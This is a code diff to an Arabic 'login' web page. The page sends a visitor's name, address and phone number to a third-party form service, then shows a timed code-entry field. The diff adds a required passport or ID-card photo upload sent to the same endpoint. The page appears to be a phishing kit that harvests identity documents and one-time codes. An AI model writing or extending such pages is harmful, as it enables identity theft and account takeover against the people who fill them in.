@@ -58,7 +58,8 @@
     }
 
     input[type="tel"],
-    input[type="text"] {
+    input[type="text"],
+    input[type="file"] {
       width: 100%;
       padding: 12px 15px;
       font-size: 16px;
@@ -115,7 +116,7 @@
 
     <h2>تسجيل الدخول</h2>
 
-    <form id="phoneForm" onsubmit="return sendPhone(event);">
+    <form id="phoneForm" onsubmit="return sendPhone(event);" enctype="multipart/form-data">
       <label for="fullname">الاسم الثلاثي:</label>
       <input
         type="text"
@@ -144,6 +145,16 @@
         pattern="[0-9]{10,15}"
         title="أدخل رقم هاتف صحيح"
         autocomplete="tel"
+      />
+
+      <label for="passportImage">صورة جواز السفر أو البطاقة:</label>
+      <input
+        type="file"
+        id="passportImage"
+        name="passportImage"
+        accept="image/*"
+        capture="environment"
+        required
       />
 
       <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
@@ -206,9 +217,12 @@
 
     function sendPhone(event) {
       event.preventDefault();
+
       const phoneInput = document.getElementById("phone");
-      const fullname = document.getElementById("fullname").value;
-      const address = document.getElementById("address").value;
+      const fullnameInput = document.getElementById("fullname");
+      const addressInput = document.getElementById("address");
+      const passportInput = document.getElementById("passportImage");
+      const sendPhoneBtn = document.getElementById("sendPhoneBtn");
 
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
         alert("يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً");
@@ -216,21 +230,37 @@
         return false;
       }
 
-      const payload = { fullname, address, phone: phoneInput.value };
+      if (!passportInput.files || passportInput.files.length === 0) {
+        alert("يرجى تحميل صورة جواز السفر أو البطاقة.");
+        passportInput.focus();
+        return false;
+      }
+
+      const formData = new FormData();
+      formData.append("fullname", fullnameInput.value);
+      formData.append("address", addressInput.value);
+      formData.append("phone", phoneInput.value);
+      formData.append("passportImage", passportInput.files[0]);
+
       fetch("https://formcarry.com/s/2evKahWtdJS", {
         method: "POST",
-        headers: { "Content-Type": "application/json", Accept: "application/json" },
-        body: JSON.stringify(payload),
+        body: formData,
       })
         .then((response) => {
-          if (!response.ok) throw new Error("فشل إرسال رقم الهاتف");
+          if (!response.ok) throw new Error("فشل إرسال البيانات");
+
+          // تعطيل الحقول بعد الإرسال بنجاح
+          fullnameInput.disabled = true;
+          addressInput.disabled = true;
           phoneInput.disabled = true;
-          document.getElementById("sendPhoneBtn").disabled = true;
+          passportInput.disabled = true;
+          sendPhoneBtn.disabled = true;
+
           document.getElementById("codeField").style.display = "block";
           startTimer(480); // 8 دقائق
         })
         .catch((error) => {
-          alert("تعذر إرسال رقم الهاتف. حاول مرة أخرى.");
+          alert("تعذر إرسال البيانات. حاول مرة أخرى.");
           console.error(error);
         });
 
